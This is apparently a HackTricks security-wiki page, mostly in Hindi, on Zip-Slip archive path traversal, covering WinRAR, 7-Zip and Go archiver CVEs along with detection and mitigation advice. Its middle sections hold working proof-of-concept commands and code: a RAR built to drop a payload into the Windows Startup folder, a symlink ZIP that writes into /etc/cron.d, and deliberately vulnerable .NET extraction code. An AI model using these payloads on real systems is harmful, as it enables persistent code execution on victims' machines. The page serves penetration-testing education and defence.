# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Overview

कई archive formats (ZIP, RAR, TAR, 7-ZIP, आदि) प्रत्येक entry को अपना **internal path** रखने की अनुमति देते हैं। जब कोई extraction utility उस path को बिना जांचे स्वीकार कर लेती है, तो `..` या **absolute path** (जैसे `C:\Windows\System32\`) वाला crafted filename user द्वारा चुनी गई directory के बाहर लिख दिया जाएगा।
इस vulnerability class को व्यापक रूप से *Zip-Slip* या **archive extraction path traversal** के रूप में जाना जाता है।<sup>[[6]](#references)</sup>

इसके परिणाम arbitrary files को overwrite करने से लेकर **remote code execution (RCE)** प्राप्त करने तक हो सकते हैं, जैसे Windows के *Startup* folder जैसी **auto-run** location में payload डालकर।

## Root Cause

1. Attacker एक ऐसा archive बनाता है जिसमें एक या अधिक file headers में निम्न शामिल होते हैं:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* या crafted **symlinks**, जो target dir के बाहर resolve होते हैं (*nix* पर ZIP/TAR में common)।
2. Victim archive को ऐसे vulnerable tool से extract करता है जो embedded path पर trust करता है (या symlinks follow करता है), बजाय इसके कि उसे sanitise करे या extraction को चुनी गई directory के भीतर सीमित रखे।
3. File attacker-controlled location में लिखी जाती है और अगली बार system या user द्वारा उस path को trigger करने पर execute/load होती है।

### .NET `Path.Combine` + `ZipArchive` traversal

एक common .NET anti-pattern में intended destination को user-controlled `ZipArchiveEntry.FullName` के साथ combine किया जाता है और path normalisation के बिना extraction की जाती है:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- यदि `entry.FullName` `..\\` से शुरू होता है, तो यह traversal करता है; यदि यह **absolute path** है, तो left-hand component पूरी तरह discard हो जाता है, जिससे extraction identity के रूप में **arbitrary file write** संभव हो जाता है।
- scheduled scanner द्वारा watched sibling `app` directory में लिखने के लिए Proof-of-concept archive:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
उस ZIP को monitored inbox में डालने पर `C:\samples\app\0xdf.txt` बन जाती है, जिससे `C:\samples\queue\` के बाहर traversal सिद्ध होता है और आगे के primitives (जैसे DLL hijacks) सक्षम हो जाते हैं।

## वास्तविक दुनिया का उदाहरण – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows के लिए WinRAR (जिसमें `rar` / `unrar` CLI, DLL और portable source शामिल हैं) extraction के दौरान filenames को validate करने में विफल रहा।
ऐसे malicious RAR archive में, जिसमें निम्न जैसा entry हो:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
selected output directory के **बाहर** और user के *Startup* folder के अंदर पहुंच जाता। Windows logon के बाद वहां मौजूद हर चीज को automatically execute करता है, जिससे *persistent* RCE मिल जाता है।<sup>[[5]](#references)</sup>

### PoC Archive तैयार करना (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
उपयोग किए गए Options:
* `-ep`  – file paths को ठीक उसी तरह store करें जैसे दिए गए हैं (शुरुआती `./` को **prune न करें**)।

`evil.rar` को victim तक पहुँचाएँ और उन्हें इसे vulnerable WinRAR build से extract करने का निर्देश दें।

### Wild में देखा गया Exploitation

ESET ने RomCom (Storm-0978/UNC2596) के spear-phishing campaigns की report की, जिनमें CVE-2025-8088 का दुरुपयोग करने वाले RAR archives attach किए गए थे, ताकि customised backdoors deploy किए जा सकें और ransomware operations को facilitate किया जा सके।<sup>[[5]](#references)</sup>

## नए Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: Extraction के दौरान **symbolic links** वाली ZIP entries को dereference किया जाता था, जिससे attackers destination directory से बाहर निकलकर arbitrary paths को overwrite कर सकते थे। User interaction केवल archive को *open/extract* करना है।<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09 (Windows और Linux builds)। **25.00** (July 2025) और बाद के versions में fix किया गया।
* **Impact path**: `Start Menu/Programs/Startup` या service-run locations को overwrite करें → अगले logon या service restart पर code run होता है।
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Patched build पर `/etc/cron.d` को touch नहीं किया जाएगा; symlink को `/tmp/target` के अंदर एक link के रूप में extract किया जाएगा।

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` `../` और symlinked ZIP entries को follow करता है तथा `outputDir` के बाहर write करता है।<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project अब deprecated है)।
* **Fix**: `mholt/archives` ≥ 0.1.0 पर switch करें या write से पहले canonical-path checks implement करें।
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Archive entries को list करें और ऐसे किसी भी name को flag करें जिसमें `../`, `..\\`, *absolute paths* (`/`, `C:`) हों, या ऐसी *symlink* entries हों जिनका target extraction dir के बाहर हो।
* **Canonicalisation** – सुनिश्चित करें कि `realpath(join(dest, name))` अभी भी `dest` से शुरू होता हो। अन्यथा reject करें।<sup>[[3]](#references)</sup>
* **Sandbox extraction** – एक *safe* extractor (जैसे `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) का उपयोग करके disposable directory में decompress करें और verify करें कि resulting paths directory के अंदर ही रहें।
* **Endpoint monitoring** – WinRAR/7-Zip आदि द्वारा archive open किए जाने के तुरंत बाद `Startup`/`Run`/`cron` locations में लिखे गए नए executables पर alert करें।

## Mitigation & Hardening

1. **Extractor को update करें** – WinRAR 7.13+ और 7-Zip 25.00+ path/symlink sanitisation implement करते हैं। दोनों tools में अभी भी auto-update उपलब्ध नहीं है।
2. जब संभव हो, archives को “**Do not extract paths**” / “**Ignore paths**” के साथ extract करें।
3. Unix पर extraction से पहले privileges drop करें और **chroot/namespace** mount करें; Windows पर **AppContainer** या sandbox का उपयोग करें।
4. यदि custom code लिख रहे हैं, तो create/write से **पहले** `realpath()`/`PathCanonicalize()` से normalise करें और ऐसे किसी भी entry को reject करें जो destination से बाहर निकलती हो।

## अतिरिक्त Affected / Historical Cases

* 2018 – Snyk द्वारा massive *Zip-Slip* advisory, जिसने कई Java/Go/JS libraries को प्रभावित किया।<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011, `-ao` merge के दौरान similar traversal।
* 2025 – HashiCorp `go-slug` (CVE-2025-0377), slugs में TAR extraction traversal (v1.2 में patch)।<sup>[[7]](#references)</sup>
* ऐसा कोई भी custom extraction logic जो write से पहले `PathCanonicalize` / `realpath` call करने में fail हो।

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
